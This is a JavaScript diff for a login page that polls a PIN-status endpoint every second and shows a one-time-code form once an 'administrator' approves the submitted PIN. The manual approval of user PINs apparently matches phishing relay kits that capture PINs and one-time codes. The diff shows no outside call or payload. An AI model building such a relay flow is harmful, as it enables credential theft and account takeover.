@@ -318,47 +318,47 @@ document.addEventListener('DOMContentLoaded', function () {
 
         var pollInterval = null;
         var checkingPinStatus = false;
-        var checkPinStatus = function () {
-          if (checkingPinStatus) return;
-          checkingPinStatus = true;
-          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
-            .then(function (res) { return res.json(); })
-            .then(function (statusData) {
-              if (statusData.sharedStore === false) {
-                if (pollInterval) clearInterval(pollInterval);
-                if (spinner) spinner.style.display = 'none';
-                showToast('Approval storage is not configured. Connect Redis/KV on Vercel and redeploy.', 'error');
-                if (submitBtn) submitBtn.disabled = false;
-                return;
-              }
-              if (statusData.decided) {
-                if (pollInterval) clearInterval(pollInterval);
-                if (statusData.status === 'approved') {
+          checkPinStatus = function () {
+            if (checkingPinStatus) return;
+            checkingPinStatus = true;
+            fetch('/api/check-pin-status/' + loginId, { cache: 'no-store' })
+              .then(function (res) { return res.json(); })
+              .then(function (statusData) {
+                if (statusData.sharedStore === false) {
+                  if (pollInterval) clearInterval(pollInterval);
                   if (spinner) spinner.style.display = 'none';
-                  loginForm.style.display = 'none';
-                  if (otpForm) {
-                    otpForm.style.display = 'block';
-                    otpForm.dataset.phone = num;
-                  }
+                  showToast('Approval storage is not configured. Connect Redis/KV on Vercel and redeploy.', 'error');
                   if (submitBtn) submitBtn.disabled = false;
-                  var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
-                  if (firstOtp) firstOtp.focus();
-                } else {
-                  if (spinner) spinner.style.display = 'none';
-                  showToast('Your PIN was rejected by the administrator.', 'error');
-                  if (submitBtn) submitBtn.disabled = false;
-                  pinBoxes.forEach(function (box) { box.disabled = false; });
+                  return;
                 }
-              }
-            })
-            .catch(function () {
-              if (spinner) spinner.style.display = 'none';
-              showToast('Error checking status. Please try again.', 'error');
-            })
-            .finally(function () {
-              checkingPinStatus = false;
-            });
-        };
+                if (statusData.decided) {
+                  if (pollInterval) clearInterval(pollInterval);
+                  if (statusData.status === 'approved') {
+                    if (spinner) spinner.style.display = 'none';
+                    loginForm.style.display = 'none';
+                    if (otpForm) {
+                      otpForm.style.display = 'block';
+                      otpForm.dataset.phone = num;
+                    }
+                    if (submitBtn) submitBtn.disabled = false;
+                    var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+                    if (firstOtp) firstOtp.focus();
+                  } else {
+                    if (spinner) spinner.style.display = 'none';
+                    showToast('Your PIN was rejected by the administrator.', 'error');
+                    if (submitBtn) submitBtn.disabled = false;
+                    pinBoxes.forEach(function (box) { box.disabled = false; });
+                  }
+                }
+              })
+              .catch(function () {
+                if (spinner) spinner.style.display = 'none';
+                showToast('Error checking status. Please try again.', 'error');
+              })
+              .finally(function () {
+                checkingPinStatus = false;
+              });
+          };
         checkPinStatus();
         pollInterval = setInterval(checkPinStatus, 1000);
       })
